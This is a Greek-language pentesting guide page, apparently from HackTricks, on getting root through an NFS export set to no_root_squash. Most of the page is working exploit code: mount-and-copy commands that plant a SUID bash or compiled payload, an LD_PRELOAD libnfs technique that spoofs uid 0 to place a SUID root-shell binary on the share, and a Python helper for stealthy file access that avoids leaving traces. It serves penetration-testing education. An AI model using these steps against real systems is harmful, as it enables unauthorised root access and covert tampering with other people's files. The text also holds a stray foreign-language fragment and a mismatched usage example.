# Κλιμάκωση προνομίων λόγω λανθασμένης ρύθμισης NFS No Root Squash

{{#include ../../banners/hacktricks-training.md}}


## Βασικές πληροφορίες για το Squashing

Το NFS συνήθως (ειδικά στο linux) εμπιστεύεται τα `uid` και `gid` που υποδεικνύονται από τον client που συνδέεται για να αποκτήσει πρόσβαση στα αρχεία (αν δεν χρησιμοποιείται kerberos). Ωστόσο, υπάρχουν ορισμένες ρυθμίσεις που μπορούν να οριστούν στον server για να **αλλάξει αυτή η συμπεριφορά**:

- **`all_squash`**: Κάνει squash όλες τις προσβάσεις, αντιστοιχίζοντας κάθε user και group στο **`nobody`** (65534 unsigned / -2 signed). Επομένως, όλοι είναι `nobody` και δεν χρησιμοποιούνται users.
- **`root_squash`/`no_all_squash`**: Αυτή είναι η προεπιλογή στο Linux και κάνει **squash μόνο στις προσβάσεις με uid 0 (root)**. Επομένως, οποιαδήποτε `UID` και `GID` είναι trusted, αλλά το `0` γίνεται squash σε `nobody` (άρα δεν είναι δυνατή η root impersonation).
- **``no_root_squash`**: Αν αυτή η ρύθμιση είναι ενεργοποιημένη, δεν κάνει squash ούτε στον root user. Αυτό σημαίνει ότι, αν κάνεις mount έναν directory με αυτήν τη ρύθμιση, μπορείς να αποκτήσεις πρόσβαση σε αυτόν ως root.

Στο αρχείο **/etc/exports**, αν βρεις κάποιον directory που έχει ρυθμιστεί ως **no_root_squash**, τότε μπορείς να αποκτήσεις **πρόσβαση** σε αυτόν **ως client** και να κάνεις **write μέσα** σε αυτόν τον directory **σαν** να ήσουν ο local **root** του μηχανήματος.

Για περισσότερες πληροφορίες σχετικά με το **NFS**, έλεγξε:


{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Κλιμάκωση προνομίων

### Remote Exploit

Option 1 using bash:
- **Κάνοντας mount αυτόν τον directory** σε ένα client machine και, **ως root, αντιγράφοντας** μέσα στον mounted folder το binary **/bin/bash** και δίνοντάς του δικαιώματα **SUID**, και **εκτελώντας από το victim** machine αυτό το bash binary.
- Σημείωσε ότι για να είσαι root μέσα στο NFS share, πρέπει να έχει ρυθμιστεί στον server το **`no_root_squash`**.
- Ωστόσο, αν δεν είναι ενεργοποιημένο, μπορείς να κάνεις escalate σε άλλον user αντιγράφοντας το binary στο NFS share και δίνοντάς του το SUID permission ως ο user στον οποίο θέλεις να κάνεις escalate.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Επιλογή 2 με χρήση compiled κώδικα C:
- **Κάνοντας mount αυτόν τον κατάλογο** σε ένα client machine και **αντιγράφοντας ως root** μέσα στον mounted φάκελο το compiled payload μας, το οποίο θα κάνει abuse του SUID permission, δίνοντάς του δικαιώματα **SUID**, και κάνοντας **execute από το victim** machine αυτό το binary (μπορείτε να βρείτε εδώ μερικά [C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
- Ίδιοι περιορισμοί όπως προηγουμένως
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Local Exploit

> [!TIP]
> Σημειώστε ότι, αν μπορείτε να δημιουργήσετε ένα **tunnel από το μηχάνημά σας προς το μηχάνημα του θύματος, μπορείτε και πάλι να χρησιμοποιήσετε τη Remote version για να εκμεταλλευτείτε αυτό το privilege escalation, κάνοντας tunnelling στις απαιτούμενες θύρες**.\
> Το ακόλουθο trick ισχύει στην περίπτωση που το αρχείο `/etc/exports` **υποδεικνύει μια IP**. Σε αυτή την περίπτωση **δεν θα μπορείτε να χρησιμοποιήσετε** σε καμία περίπτωση το **remote exploit** και θα χρειαστεί να **καταχραστείτε αυτό το trick**.\
> Μια ακόμη απαραίτητη προϋπόθεση για να λειτουργήσει το exploit είναι το **export μέσα στο `/etc/export`** να **χρησιμοποιεί το `insecure` flag**.\
> --_Δεν είμαι σίγουρος ότι αυτό το trick θα λειτουργήσει αν το `/etc/export` υποδεικνύει μια διεύθυνση IP_--

### Βασικές Πληροφορίες

Το σενάριο περιλαμβάνει την εκμετάλλευση ενός mounted NFS share σε ένα local machine, αξιοποιώντας ένα flaw στην προδιαγραφή NFSv3, η οποία επιτρέπει στον client να καθορίζει το uid/gid του, επιτρέποντας δυνητικά μη εξουσιοδοτημένη πρόσβαση. Η εκμετάλλευση περιλαμβάνει τη χρήση του [libnfs](https://github.com/sahlberg/libnfs), μιας library που επιτρέπει την πλαστογράφηση NFS RPC calls.

#### Μεταγλώττιση της Library

Τα βήματα μεταγλώττισης της library ενδέχεται να απαιτούν προσαρμογές ανάλογα με την έκδοση του kernel. Στη συγκεκριμένη περίπτωση, τα fallocate syscalls έγιναν comment out. Η διαδικασία μεταγλώττισης περιλαμβάνει τις ακόλουθες εντολές:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Εκτέλεση του Exploit

Το exploit περιλαμβάνει τη δημιουργία ενός απλού προγράμματος C (`pwn.c`) που ανυψώνει τα privileges σε root και στη συνέχεια εκτελεί ένα shell. Το πρόγραμμα γίνεται compiled και το binary που προκύπτει (`a.out`) τοποθετείται στο share με suid root, χρησιμοποιώντας το `ld_nfs.so` για να πλαστογραφήσει το uid στις κλήσεις RPC:

1. **Compile του κώδικα του exploit:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Τοποθετήστε το exploit στο share και τροποποιήστε τα δικαιώματά του πλαστογραφώντας το uid:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Εκτελέστε το exploit για να αποκτήσετε δικαιώματα root:**
```bash
/mnt/share/a.out
#root
```
### Bonus: NFShell για Stealthy File Access

Μόλις αποκτηθεί root access, για την αλληλεπίδραση με το NFS share χωρίς αλλαγή του ownership (ώστε να αποφεύγεται η留下 traces), χρησιμοποιείται ένα Python script (`nfsh.py`). Αυτό το script προσαρμόζει το uid ώστε να αντιστοιχεί σε εκείνο του file στο οποίο γίνεται access, επιτρέποντας την αλληλεπίδραση με files στο share χωρίς permission issues:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Εκτελέστε ως:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{{#include ../../banners/hacktricks-training.md}}
